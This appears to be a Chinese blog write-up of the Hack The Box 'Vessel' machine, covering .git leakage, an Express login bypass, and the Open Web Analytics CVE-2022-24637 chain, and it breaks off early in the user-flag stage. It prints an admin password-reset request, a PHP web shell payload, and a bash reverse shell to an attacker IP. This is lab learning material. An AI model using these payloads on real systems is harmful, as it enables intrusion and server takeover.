@@ -1,0 +1,616 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>HTB:Vessel | 持剑</title>
+<meta name="description" content="碎月星辰揽江风 , 我心有剑问天涯 ">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://1dayluo.github.io/favicon.ico?v=1711284755357">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://1dayluo.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://1dayluo.github.io">
+        <img class="avatar" src="https://1dayluo.github.io/images/avatar.png?v=1711284755357" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://1dayluo.github.io">
+        <h1 class="site-title">持剑</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">HTB:Vessel</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2023-04-02</span>
+            
+          </div>
+          <div class="post-content" v-pre>
+            <h1 id="htbvessel">HTB：Vessel</h1>
+<p>关键词： .git,git information leak,express mis-handles,owa 1.7.3, CVE-2022-24637,PyInstaller generated executable file,pdfcrack</p>
+<h2 id="base-recon">Base Recon</h2>
+<p>rustscan端口扫描结果</p>
+<pre><code class="language-python">Open 10.10.11.178:53
+Open 10.10.11.178:22
+</code></pre>
+<p>用wfuzz/gobuster目录遍历（手动把一些大小写不同的重复的目录删了）</p>
+<pre><code class="language-python">000000009:   200        70 L     182 W      4213 Ch     &quot;login&quot;                                                                                   
+000000025:   200        89 L     234 W      5830 Ch     &quot;register&quot;                                                                               
+000000122:   200        51 L     125 W      2393 Ch     &quot;404&quot;                                                                                    
+000000237:   301        10 L     16 W       173 Ch      &quot;dev&quot;                                           
+000000400:   200        243 L    871 W      15030 Ch    &quot;.&quot;                                             
+000000586:   200        51 L     117 W      2335 Ch     &quot;500&quot;                                           
+000000712:   200        89 L     234 W      5830 Ch     &quot;Register&quot;                                      
+000000945:   200        52 L     120 W      2400 Ch     &quot;401&quot;                                           
+000001688:   200        63 L     177 W      3637 Ch     &quot;reset&quot;
+000004658:   403        9 L      28 W       277 Ch      &quot;server-status&quot;
+</code></pre>
+<p>子域名wfuzz貌似没什么结果（挠头.jpg)</p>
+<p>用Wappalyzer分析的技术框架 如图</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402.png" alt="20230402" loading="lazy"></figure>
+<p>以及用burpsuite的find comment查找注释</p>
+<h2 id="git">.Git</h2>
+<p>这个时候思路卡住了，看0xdf大佬的笔记发现是需要看 <code>.git</code>  ,这里可以记个笔记，除了常见得端口，子域名/目录遍历，功能点人工测试（包括api）,查找注释，技术框架历史漏洞exploit外，还可以看 <code>.git</code> ，之前在刷Pentesterlab，Blue专题得时候也刷到过（<strong>Git Information Leak II）</strong></p>
+<h3 id="手工提取">手工提取</h3>
+<p>如果网站设置禁止访问 <code>.git</code> ,那么可以访问</p>
+<ul>
+<li>.git/config</li>
+<li>.git/HEAD</li>
+</ul>
+<p>这里的对应目录是 <code>/dev/.git/config</code>  和  <code>/dev/.git/HEAD</code></p>
+<pre><code class="language-python">Request : GET /dev/.git/HEAD
+Response :ref: refs/heads/master
+
+Request: GET /dev/.git/config
+Response: 
+				[core]
+					repositoryformatversion = 0
+					filemode = true
+					bare = false
+					logallrefupdates = true
+				[user]
+					name = Ethan
+					email = ethan@vessel.htb
+				
+</code></pre>
+<p>知道head后，将HEAD换成对应的 <code>refs/heads/master</code> 得到hash：</p>
+<pre><code class="language-python">208167e785aae5b052a4a2f9843d74e733fbd917
+</code></pre>
+<p>根据所得到的hash访问:  <code>.git/objects/{{hash-前两个字母}}/{{hash后半部分}}</code> ,这里就是 <code>/dev/.git/objects/20/8167e785aae5b052a4a2f9843d74e733fbd917</code></p>
+<p>wget对应的文件，然后用file判断文件类型（一般是zlib）</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%201.png" alt="20230402" loading="lazy"></figure>
+<p>获取zlib的内容</p>
+<pre><code class="language-python">printf &quot;\x1f\x8b\x08\x00\x00\x00\x00\x00&quot; |cat - 8167e785aae5b052a4a2f9843d74e733fbd917  | gzip -cd -q
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%202.png" alt="20230402" loading="lazy"></figure>
+<p>得到邮箱 <code>ethan@vessel.htb</code></p>
+<p>同时还得到新的hash</p>
+<pre><code class="language-python">6ab71e25904c53073631f4f613f88d762cc4a0e3
+edb18f3e0cd9ee39769ff3951eeb799dd1d8517e
+</code></pre>
+<p>同样的方法，分别访问</p>
+<pre><code class="language-python">http://10.10.11.178/dev/.git/objects/6a/b71e25904c53073631f4f613f88d762cc4a0e3
+http://10.10.11.178/dev/.git/objects/ed/b18f3e0cd9ee39769ff3951eeb799dd1d8517e
+</code></pre>
+<h3 id="使用工具">使用工具</h3>
+<p>因为这样的方式很繁琐，并且需要重复，工具的话一般有</p>
+<ul>
+<li>git-money</li>
+<li>GitTools</li>
+<li>DVCS-Pillage</li>
+<li>git-dumper</li>
+</ul>
+<p>这里用git-dumper （ <code>pipx install git-dumper</code>  pipx是基于pip的可以安装包到隔离环境里，且减少依赖冲突的一种包管理工具)</p>
+<p>使用git-dumper</p>
+<pre><code class="language-python">git-dumper http://10.10.11.178/dev git
+</code></pre>
+<p>提取完成后有以下目录</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%203.png" alt="20230402" loading="lazy"></figure>
+<h3 id="分析git提交记录代码">分析git提交记录/代码</h3>
+<p>查看历史commits</p>
+<pre><code class="language-python">~ git log --oneline                                                                        (exploit) 0 [17:36:28]
+208167e (HEAD -&gt; master) Potential security fixes
+edb18f3 Security Fixes
+f1369cf Initial commit
+</code></pre>
+<p>查看security fixes是什么内容</p>
+<pre><code class="language-python">git diff f1369cf edb18f3
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%204.png" alt="20230402" loading="lazy"></figure>
+<p>另外两条</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%205.png" alt="20230402" loading="lazy"></figure>
+<p>查看对应的db代码，看无password什么的</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%206.png" alt="20230402" loading="lazy"></figure>
+<p>（这里有 <code>daqvACHKvRn84VdVp</code>）</p>
+<h2 id="bypass-login">Bypass Login</h2>
+<blockquote>
+<p>Query escape functions like above are meant to fill replace the <code>?</code><br>
+ with the strings and not allow any code there such as open/close quotes or equals signs. However, Express mis-handles how different object types are passed into these function.</p>
+</blockquote>
+<h3 id="express-mis-handles">express mis-handles</h3>
+<p>这里看到代码虽然用了 <code>?</code> 来防止sql注入，</p>
+<pre><code class="language-python">connection.query('SELECT * FROM accounts WHERE username = ? AND password = ?', [username, password], function(error, results, fields) {
+</code></pre>
+<p>但是expres有一些特性会破坏原本的sql语句，例如</p>
+<pre><code class="language-python">{
+    &quot;username&quot;: &quot;admin&quot;,
+    &quot;password&quot;: {
+        &quot;password&quot;: 1,
+    }
+}
+</code></pre>
+<p>就会变成</p>
+<pre><code class="language-python">SELECT * FROM accounts WHERE username = 'admin' AND password = `password` = 1;
+</code></pre>
+<p>按照这个思路发起请求（这里如果不是 <code>application/json</code> 而是 <code>application/x-www-form-urlencoded</code> 其实也可以，用password[password]=1 就可以</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%207.png" alt="20230402" loading="lazy"></figure>
+<p>最后进入管理员面板（好耶）</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%208.png" alt="20230402" loading="lazy"></figure>
+<p>点击如图的Analytics功能发现会进入 <a href="http://openwebanalytics.vessel.htb/"><code>http://openwebanalytics.vessel.htb/</code></a> 里，添加到 <code>/ect/hosts</code> 里</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%209.png" alt="20230402" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2010.png" alt="20230402" loading="lazy"></figure>
+<h2 id="open-web-analytics">Open Web Analytics</h2>
+<p>只有找会密码。试了刚刚git泄漏的用户 <code>ethan@vessel.htb</code> 没有什么结果（提示Error，没有对应邮箱），看index.php会处理两个参数,分别是 <code>owa_do</code>和 <code>owa_go</code> ，分别代表着当前操作和跳转</p>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2011.png" alt="20230402" loading="lazy"></figure>
+<p>在源代码中看出当前version的版本是 1.7.3</p>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2012.png" alt="20230402" loading="lazy"></figure>
+<p>搜索关键词+exploit发现有漏洞 <code>CVE-2022-24637</code>  （参考文章：<a href="https://devel0pment.de/?p=2494">https://devel0pment.de/?p=2494</a>）</p>
+<h3 id="缓存机制的利用">缓存机制的利用</h3>
+<p>漏洞的关键是存在一个缓存机制，并且缓存自动将base64编码后得comments和header，footer拼接，并放在了单引号里。在单双引号escape sequences存在巨大的区别（截图来自刚刚那篇文章）：</p>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2013.png" alt="20230402" loading="lazy"></figure>
+<p>单引号不会转义特殊字符，例如 <code>\n</code> ，这样就可以破坏php代码的格式，从而不按照php代码解析导致信息泄漏。而owa（open web analytics）的缓存机制是在目录 <strong><code>/owa-data/caches/</code></strong> 下，即使用户没登录，也可以伪造登录创造缓存。刚刚试过了用户 <code>ethan@vessel.htb</code>  这次将用户名换为admin，创造缓存，然后访问对应cache目录，然而当我们访问目录时，</p>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2014.png" alt="20230402" loading="lazy"></figure>
+<p>却是空白。</p>
+<blockquote>
+<p>However, immediately after a failed login, it returns an empty page. The cache seems to clear this directory periodically.</p>
+</blockquote>
+<p>看起来这个方法行不通。但是在那篇讲解 <code>CVE-2022-24637</code>  的文章里还提到了，文件名是可预测的。我们从这个点出发，尝试探索（这里偷了个懒，我没有去下载历史版本，本地进行代码分析，而是选择阅读0xdf的文章+github的历史版本仓库链接进行代码分析）。阅读<a href="https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/modules/base/classes/fileCache.php#L141-L148">源代码</a>可以看到文件名是由变量 <code>$collection_dir</code> 拼接而成的</p>
+<pre><code class="language-php">function putItemToCacheStore($collection, $id) {
+....
+$collection_dir = $this-&gt;makeCollectionDirPath($collection);
+$cache_file = $collection_dir.$id.'.php';
+....
+}
+</code></pre>
+<p>这里 <code>putItemToCacheStore</code> 函数被 <code>cache.php</code> 内的 <code>persistCache</code> 而调用。cache_file由两个变量组成</p>
+<ul>
+<li><code>$collection_dir</code></li>
+<li><code>$id</code></li>
+</ul>
+<p>然后看函数  <code>$this-&gt;makeCollectionDirPath</code> 这里看到</p>
+<ul>
+<li><code>$collection_dir</code> 为  <code>owa-data/caches</code></li>
+<li><code>cache_id</code> 为 <code>1</code></li>
+<li><code>$collection</code> 为目录，例如 <code>owa_user</code>, <code>owa_site</code><br>
+,</li>
+</ul>
+<pre><code class="language-php">function makeCollectionDirPath($collection) {
+
+        if (!in_array($collection, $this-&gt;global_collections)) {
+            return $this-&gt;cache_dir.$this-&gt;cache_id.'/'.$collection.'/';
+
+        } else {
+            return $this-&gt;cache_dir.$collection.'/';
+// owa-data/caches/1
+        }
+    }
+</code></pre>
+<p>查看调用 <code>putItemToCacheStore</code> 的函数 <code>persistCache</code> 关于 <code>$id</code> 的定义</p>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2015.png" alt="20230402" loading="lazy"></figure>
+<p>而 <code>$this-&gt;dirty_objs</code> 在函数 <code>set</code> （cache.php） 里被定义</p>
+<pre><code class="language-php">$hkey = $this-&gt;hash($key); // 计算md5
+$this-&gt;dirty_objs[$collection][$hkey] = $hkey;
+</code></pre>
+<p>调用函数set的函数代码</p>
+<pre><code class="language-php">function addToCache($col = 'id') {
+        
+        if($this-&gt;isCachable()) {
+            $cache = owa_coreAPI::cacheSingleton();
+            $cache-&gt;setCollectionExpirationPeriod($this-&gt;getTableName(), $this-&gt;getCacheExpirationPeriod());
+            $cache-&gt;set($this-&gt;getTableName(), $col.$this-&gt;get('id'), $this, $this-&gt;getCacheExpirationPeriod());
+        }
+    }
+</code></pre>
+<p>调用addToCache的函数</p>
+<pre><code class="language-php">function getByColumn($col, $value) {
+...[snip]...
+        } else {
+        
+            $db = owa_coreAPI::dbSingleton();
+            $db-&gt;selectFrom($this-&gt;getTableName());
+            $db-&gt;selectColumn('*');
+            owa_coreAPI::debug(&quot;Col: $col, value: $value&quot;);    
+            $db-&gt;where($col, $value);
+            $properties = $db-&gt;getOneRow();
+            
+            if (!empty($properties)) {
+                
+                $this-&gt;setProperties($properties);
+                $this-&gt;wasPersisted = true;
+                // add to cache            
+                $this-&gt;addToCache($col);
+                owa_coreAPI::debug('entity loaded from db');        
+            }
+</code></pre>
+<p>有多处调用该函数，但是有一处是用户操作有关，给定了 <code>user_id</code>：</p>
+<pre><code class="language-php">function getUser() {
+
+        // fetch user object from the db
+        $this-&gt;u = owa_coreAPI::entityFactory('base.user');
+        $this-&gt;u-&gt;getByColumn('user_id', $this-&gt;credentials['user_id']);
+    }
+</code></pre>
+<p>所以例如GetUser对应得是 <code>user_id1</code>  （转为md5 ： <code>c30da9265ba0a4704db9229f864c9eb7</code> ）</p>
+<p>然后根据以上分析的，访问 cache_file</p>
+<pre><code class="language-php">http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2016.png" alt="20230402" loading="lazy"></figure>
+<p>base64 decode</p>
+<pre><code class="language-php">O:8:&quot;owa_user&quot;:5:{s:4:&quot;name&quot;;s:9:&quot;base.user&quot;;s:10:&quot;properties&quot;;a:10:{s:2:&quot;id&quot;;O:12:&quot;owa_dbColumn&quot;:11:{s:4:&quot;name&quot;;N;s:5:&quot;value&quot;;s:1:&quot;1&quot;;s:9:&quot;data_type&quot;;s:6:&quot;SERIAL&quot;;s:11:&quot;foreign_key&quot;;N;s:14:&quot;is_primary_key&quot;;b:0;s:14:&quot;auto_increment&quot;;b:0;s:9:&quot;is_unique&quot;;b:0;s:11:&quot;is_not_null&quot;;b:0;s:5:&quot;label&quot;;N;s:5:&quot;index&quot;;N;s:13:&quot;default_value&quot;;N;}s:7:&quot;user_id&quot;;O:12:&quot;owa_dbColumn&quot;:11:{s:4:&quot;name&quot;;N;s:5:&quot;value&quot;;s:5:&quot;admin&quot;;s:9:&quot;data_type&quot;;s:12:&quot;VARCHAR(255)&quot;;s:11:&quot;foreign_key&quot;;N;s:14:&quot;is_primary_key&quot;;b:1;s:14:&quot;auto_increment&quot;;b:0;s:9:&quot;is_unique&quot;;b:0;s:11:&quot;is_not_null&quot;;b:0;s:5:&quot;label&quot;;N;s:5:&quot;index&quot;;N;s:13:&quot;default_value&quot;;N;}s:8:&quot;password&quot;;O:12:&quot;owa_dbColumn&quot;:11:{s:4:&quot;name&quot;;N;s:5:&quot;value&quot;;s:60:&quot;$2y$10$yjH5xlwtXG9VoB66ridzt.x9iL9jvBfeHByOXtmUQqDU9an7hyscy&quot;;s:9:&quot;data_type&quot;;s:12:&quot;VARCHAR(255)&quot;;s:11:&quot;foreign_key&quot;;N;s:14:&quot;is_primary_key&quot;;b:0;s:14:&quot;auto_increment&quot;;b:0;s:9:&quot;is_unique&quot;;b:0;s:11:&quot;is_not_null&quot;;b:0;s:5:&quot;label&quot;;N;s:5:&quot;index&quot;;N;s:13:&quot;default_value&quot;;N;}s:4:&quot;role&quot;;O:12:&quot;owa_dbColumn&quot;:11:{s:4:&quot;name&quot;;N;s:5:&quot;value&quot;;s:5:&quot;admin&quot;;s:9:&quot;data_type&quot;;s:12:&quot;VARCHAR(255)&quot;;s:11:&quot;foreign_key&quot;;N;s:14:&quot;is_primary_key&quot;;b:0;s:14:&quot;auto_increment&quot;;b:0;s:9:&quot;is_unique&quot;;b:0;s:11:&quot;is_not_null&quot;;b:0;s:5:&quot;label&quot;;N;s:5:&quot;index&quot;;N;s:13:&quot;default_value&quot;;N;}s:9:&quot;real_name&quot;;O:12:&quot;owa_dbColumn&quot;:11:{s:4:&quot;name&quot;;N;s:5:&quot;value&quot;;s:13:&quot;default admin&quot;;s:9:&quot;data_type&quot;;s:12:&quot;VARCHAR(255)&quot;;s:11:&quot;foreign_key&quot;;N;s:14:&quot;is_primary_key&quot;;b:0;s:14:&quot;auto_increment&quot;;b:0;s:9:&quot;is_unique&quot;;b:0;s:11:&quot;is_not_null&quot;;b:0;s:5:&quot;label&quot;;N;s:5:&quot;index&quot;;N;s:13:&quot;default_value&quot;;N;}s:13:&quot;email_address&quot;;O:12:&quot;owa_dbColumn&quot;:11:{s:4:&quot;name&quot;;N;s:5:&quot;value&quot;;s:16:&quot;admin@vessel.htb&quot;;s:9:&quot;data_type&quot;;s:12:&quot;VARCHAR(255)&quot;;s:11:&quot;foreign_key&quot;;N;s:14:&quot;is_primary_key&quot;;b:0;s:14:&quot;auto_increment&quot;;b:0;s:9:&quot;is_unique&quot;;b:0;s:11:&quot;is_not_null&quot;;b:0;s:5:&quot;label&quot;;N;s:5:&quot;index&quot;;N;s:13:&quot;default_value&quot;;N;}s:12:&quot;temp_passkey&quot;;O:12:&quot;owa_dbColumn&quot;:11:{s:4:&quot;name&quot;;N;s:5:&quot;value&quot;;s:32:&quot;ac9e4437ca5150340fdd0578d70a4211&quot;;s:9:&quot;data_type&quot;;s:12:&quot;VARCHAR(255)&quot;;s:11:&quot;foreign_key&quot;;N;s:14:&quot;is_primary_key&quot;;b:0;s:14:&quot;auto_increment&quot;;b:0;s:9:&quot;is_unique&quot;;b:0;s:11:&quot;is_not_null&quot;;b:0;s:5:&quot;label&quot;;N;s:5:&quot;index&quot;;N;s:13:&quot;default_value&quot;;N;}s:13:&quot;creation_date&quot;;O:12:&quot;owa_dbColumn&quot;:11:{s:4:&quot;name&quot;;N;s:5:&quot;value&quot;;s:10:&quot;1650211659&quot;;s:9:&quot;data_type&quot;;s:6:&quot;BIGINT&quot;;s:11:&quot;foreign_key&quot;;N;s:14:&quot;is_primary_key&quot;;b:0;s:14:&quot;auto_increment&quot;;b:0;s:9:&quot;is_unique&quot;;b:0;s:11:&quot;is_not_null&quot;;b:0;s:5:&quot;label&quot;;N;s:5:&quot;index&quot;;N;s:13:&quot;default_value&quot;;N;}s:16:&quot;last_update_date&quot;;O:12:&quot;owa_dbColumn&quot;:11:{s:4:&quot;name&quot;;N;s:5:&quot;value&quot;;s:10:&quot;1650211659&quot;;s:9:&quot;data_type&quot;;s:6:&quot;BIGINT&quot;;s:11:&quot;foreign_key&quot;;N;s:14:&quot;is_primary_key&quot;;b:0;s:14:&quot;auto_increment&quot;;b:0;s:9:&quot;is_unique&quot;;b:0;s:11:&quot;is_not_null&quot;;b:0;s:5:&quot;label&quot;;N;s:5:&quot;index&quot;;N;s:13:&quot;default_value&quot;;N;}s:7:&quot;api_key&quot;;O:12:&quot;owa_dbColumn&quot;:11:{s:4:&quot;name&quot;;s:7:&quot;api_key&quot;;s:5:&quot;value&quot;;s:32:&quot;a390cc0247ecada9a2b8d2338b9ca6d2&quot;;s:9:&quot;data_type&quot;;s:12:&quot;VARCHAR(255)&quot;;s:11:&quot;foreign_key&quot;;N;s:14:&quot;is_primary_key&quot;;b:0;s:14:&quot;auto_increment&quot;;b:0;s:9:&quot;is_unique&quot;;b:0;s:11:&quot;is_not_null&quot;;b:0;s:5:&quot;label&quot;;N;s:5:&quot;index&quot;;N;s:13:&quot;default_value&quot;;N;}}s:16:&quot;_tableProperties&quot;;a:4:{s:5:&quot;alias&quot;;s:4:&quot;user&quot;;s:4:&quot;name&quot;;s:8:&quot;owa_user&quot;;s:9:&quot;cacheable&quot;;b:1;s:23:&quot;cache_expiration_period&quot;;i:604800;}s:12:&quot;wasPersisted&quot;;b:1;s:5:&quot;cache&quot;;N;}
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2017.png" alt="20230402" loading="lazy"></figure>
+<h2 id="login-file-writer">Login &amp; file writer</h2>
+<h3 id="login-as-admin">login as admin</h3>
+<p>还是刚刚那篇分析cve的文章</p>
+<figure data-type="image" tabindex="19"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2018.png" alt="20230402" loading="lazy"></figure>
+<p>提到了可以用action： <strong><code>base.usersChangePassword</code></strong> 实现登录</p>
+<p>相关的源代码 （位于 <code>owa_usersChangePasswordController</code> 下）</p>
+<pre><code class="language-php">function action() {
+		
+		// needed for old style embedded install migration
+		if ( $this-&gt;getParam('is_embedded') ) {
+			
+			owa_coreAPI::setSetting('base', 'is_embedded', true);
+		}
+		
+		
+        $auth = owa_auth::get_instance();
+        $status = $auth-&gt;authenticateUserTempPasskey($this-&gt;params['k']);
+
+        // log to event queue
+        if ($status === true) {
+            $ed = owa_coreAPI::getEventDispatch();
+            $new_password = array('key' =&gt; $this-&gt;params['k'], 'password' =&gt; $this-&gt;params['password'], 'ip' =&gt; $_SERVER['REMOTE_ADDR'], 'user_id' =&gt; $auth-&gt;u-&gt;get('user_id'));
+            $ed-&gt;log($new_password, 'base.set_password');
+            $auth-&gt;deleteCredentials();
+            $this-&gt;setRedirectAction('base.loginForm');
+            $this-&gt;set('status_code', 3006);
+        } else {
+            $this-&gt;setRedirectAction('base.loginForm');
+            $this-&gt;set('error_code', 2011); // can't find key in the db
+        }
+    }
+</code></pre>
+<p>首先要读取 <code>$this-&gt;params['k']</code> 然后判定状态status为true，要构造的：</p>
+<ul>
+<li><code>$this-&gt;params['k']</code> ： 为刚刚的temp_passkey ac9e4437ca5150340fdd0578d70a4211</li>
+<li><code>$this-&gt;params['password']</code> 新得password</li>
+</ul>
+<pre><code class="language-php">owa_user_id=admin&amp;owa_password=qwe123&amp;owa_password2=qwe123&amp;owa_action=base.usersChangePassword&amp;owa_k=36bb6d5b1da9942b1447a1e226d34766
+</code></pre>
+<figure data-type="image" tabindex="20"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2019.png" alt="20230402" loading="lazy"></figure>
+<figure data-type="image" tabindex="21"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2020.png" alt="20230402" loading="lazy"></figure>
+<p>我这里做题太久了，靶场被重置了一下，所以temp_passkey换成最新的了。</p>
+<h3 id="php-file-write">php file write</h3>
+<p>根据那篇分析cve的<a href="https://devel0pment.de/?p=2494">文章</a>，点进settings，这里文件上传对应的action是 <strong><code>base.optionsUpdate</code></strong> 与之对应得Controller是 <strong><code>owa_optionsUpdateController</code></strong></p>
+<p>代码分析过程就不复述了，关键部分截图如下</p>
+<figure data-type="image" tabindex="22"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2021.png" alt="20230402" loading="lazy"></figure>
+<p><a href="https://www.notion.so">https://www.notion.so</a></p>
+<p>这里我们可以通过修改对应的 <code>base.error_log_file</code>  和 <code>base.error_log_level</code> ****来使得攻击者构造得内容写入文件中</p>
+<p>我们这里看<a href="http://openwebanalytics.vessel.htb/index.php?owa_do=base.optionsGeneral">http://openwebanalytics.vessel.htb/index.php?owa_do=base.optionsGeneral</a> 也能看到对应的Log File所在目录</p>
+<figure data-type="image" tabindex="23"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2022.png" alt="20230402" loading="lazy"></figure>
+<p>创建请求测试，验证访问（发现文件被创建了）：<a href="http://openwebanalytics.vessel.htb/owa-data/logs/neko.php">http://openwebanalytics.vessel.htb/owa-data/logs/neko.php</a></p>
+<pre><code class="language-php">POST /index.php?owa_do=base.optionsGeneral HTTP/1.1
+Host: openwebanalytics.vessel.htb
+Content-Length: 185
+Cache-Control: max-age=0
+Origin: http://openwebanalytics.vessel.htb
+DNT: 1
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://openwebanalytics.vessel.htb/index.php?owa_do=base.optionsGeneral&amp;owa_site_id=&amp;owa_status_code=2500&amp;
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: owa_userSession=admin; owa_passwordSession=bf38e9d85b691942e25d3967408d1fc4fdbd0033b7d409d3f7b3617173e81409
+sec-gpc: 1
+Connection: close
+
+owa_config%5Bbase.error_log_level%5D=2&amp;owa_config%5Bbase.error_log_file%5D=/var/www/html/owa/owa-data/logs/neko.php&amp;&amp;owa_nonce=81b2a1198d&amp;owa_action=base.optionsUpdate&amp;owa_module=base
+</code></pre>
+<p>拿shell(访问 <a href="http://openwebanalytics.vessel.htb/owa-data/logs/neko.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.24/2333%200%3E%261%27"><code>http://openwebanalytics.vessel.htb/owa-data/logs/neko.php?cmd=bash -c 'bash -i &gt;%26 /dev/tcp/10.10.14.24/2333 0&gt;%261'</code></a></p>
+<pre><code class="language-php">owa_config%5Bbase.neko%5D=&lt;%3fphp+system($_REQUEST['cmd'])%3b+%3f&gt;&amp;&amp;&amp;owa_nonce=81b2a1198d&amp;owa_action=base.optionsUpdate&amp;owa_module=base
+</code></pre>
+<p>这里测试失败好几次，建议还是intercept拦截，一定要看到前端页面提示修改成功的英文提示，不然直接repeater改会有问题</p>
+<h2 id="user-flag">User flag</h2>
+<h3 id="连接服务器探索">连接服务器&amp;探索</h3>
+<p>本地nc</p>
+<pre><code class="language-php">nc -lnvp 2333
+</code></pre>
+<p>构造的请求</p>
+<pre><code class="language-php">http://openwebanalytics.vessel.htb/owa-data/logs/neko.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.24/2333%200%3E%261%27
+</code></pre>
+<p>然后升级shell</p>
+<figure data-type="image" tabindex="24"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2023.png" alt="20230402" loading="lazy"></figure>
+<p>home目录下只能进入steven</p>
+<figure data-type="image" tabindex="25"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2024.png" alt="20230402" loading="lazy"></figure>
+<p>查看steven目录下的文件passwordGenerator</p>
+<pre><code class="language-php">www-data@vessel:/home/steven$ file passwordGenerator
+file passwordGenerator
+passwordGenerator: PE32 executable (console) Intel 80386, for MS Windows
+</code></pre>
+<p>除此之外还有隐藏文件夹 <code>.notes</code> （通过 <code>ls -la</code> 查看到）开一个http服务器获取文件 （也可以用nc传文件）</p>
+<pre><code class="language-php">python3 -m http.server 9000
+</code></pre>
+<p>文件1：screenshot.png</p>
+<figure data-type="image" tabindex="26"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2025.png" alt="20230402" loading="lazy"></figure>
+<p>文件2：notes.pdf</p>
